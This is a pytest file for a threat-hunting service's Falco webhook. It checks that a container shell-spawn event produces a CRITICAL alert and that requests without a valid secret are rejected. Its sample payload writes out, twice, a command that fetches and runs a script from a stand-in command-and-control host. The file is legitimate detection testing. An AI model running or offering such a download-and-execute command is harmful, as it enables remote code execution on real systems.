import pytest
from sqlalchemy import create_engine, event
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.db.base import Base
from app.api.webhooks import FalcoWebhookPayload, falco_runtime_alert_webhook
from app.services.threat_hunting.rule_service import rule_service
from app.services.threat_hunting.detection_engine import detection_engine
from app.services.threat_hunting.alert_service import alert_service


# Isolated in-memory SQLite database
TEST_DB_URL = "sqlite:///:memory:"
test_engine = create_engine(
    TEST_DB_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)


@event.listens_for(test_engine, "connect")
def set_sqlite_pragma(dbapi_connection, connection_record):
    cursor = dbapi_connection.cursor()
    cursor.execute("PRAGMA foreign_keys=ON")
    cursor.close()


TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)


@pytest.fixture(scope="module", autouse=True)
def setup_test_db():
    Base.metadata.create_all(bind=test_engine)
    db = TestingSessionLocal()
    try:
        rule_service.seed_default_rules(db)
    finally:
        db.close()
    yield


@pytest.fixture
def db():
    session = TestingSessionLocal()
    try:
        yield session
    finally:
        session.close()


def test_falco_shell_spawned_webhook_generates_critical_alert(db):
    """
    Verifies that a Falco alert for a spawned shell (/bin/sh) inside a Ray worker container
    triggers an immediate CRITICAL Threat Hunting alert.
    """
    payload = FalcoWebhookPayload(
        rule="Terminal shell in container",
        priority="Critical",
        output=(
            "11:25:00.123: Critical A shell was spawned in a container with an attached terminal "
            "(user=root k8s.pod=sentinelml-rayjob-worker-xyz shell=sh cmdline=sh -c curl -s http://c2.exfil/rev.sh | bash)"
        ),
        output_fields={
            "container.id": "c123456789",
            "container.name": "ray-worker",
            "k8s.pod.name": "sentinelml-rayjob-worker-xyz",
            "k8s.ns.name": "default",
            "proc.name": "sh",
            "proc.cmdline": "sh -c curl -s http://c2.exfil/rev.sh | bash",
            "user.name": "root",
        },
    )

    res = falco_runtime_alert_webhook(payload=payload, db=db, x_falco_secret="sentinelml-dev-falco-webhook-secret-32b")
    assert res["status"] == "ingested"
    assert res["event_id"] is not None

    # Verify that the Threat Hunting engine evaluated and produced an alert
    detections = detection_engine.evaluate_all_rules(db)
    falco_detections = [
        d for d in detections if "Container Runtime Unauthorized Process" in d.title
    ]
    assert len(falco_detections) > 0, "Expected a Falco container intrusion detection!"
    alert = alert_service.process_detection(db, falco_detections[0])

    assert alert.severity == "CRITICAL"
    assert "Container Runtime Unauthorized Process" in alert.title
    assert alert.mitre_attack_id == "T1059.004"
    assert alert.mitre_atlas_id == "AML.T0038"


def test_falco_webhook_unauthorized_rejection(db):
    """
    Verifies that Falco webhook rejects unauthenticated requests (missing or invalid secret) with HTTP 401.
    """
    payload = FalcoWebhookPayload(
        rule="Terminal shell in container",
        priority="Critical",
        output="Critical A shell was spawned",
        output_fields={"proc.name": "sh"},
    )

    # Missing secret
    res_missing = falco_runtime_alert_webhook(payload=payload, db=db, x_falco_secret=None)
    assert res_missing.status_code == 401

    # Invalid secret
    res_invalid = falco_runtime_alert_webhook(payload=payload, db=db, x_falco_secret="invalid-secret-key")
    assert res_invalid.status_code == 401
